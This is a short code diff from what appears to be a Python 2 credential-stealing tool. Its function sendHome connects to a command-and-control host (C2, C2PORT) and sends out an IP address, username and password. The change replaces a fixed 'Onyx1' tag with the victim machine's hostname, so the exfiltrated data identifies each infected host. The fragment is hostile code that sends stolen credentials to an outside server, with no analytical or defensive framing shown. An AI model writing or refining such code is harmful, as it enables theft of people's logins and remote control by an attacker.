@@ -59,16 +59,12 @@ def formatStrings(ip, usr, pw):
 def sendHome(ip, usr, pw):
     try:
         s.connect(C2, C2PORT)
-        s.send("Onyx1: " + " " + ip + " " + usr + " " + pw)
+        s.send(socket.gethostname() + ": " + ip + " " + usr + " " + pw)
     except socket.error, ex:
         print ex
-    
-
-    
-
+   
 if __name__ == "__main__":
     recvConnection()
-
 
 '''
 #Logs information to console
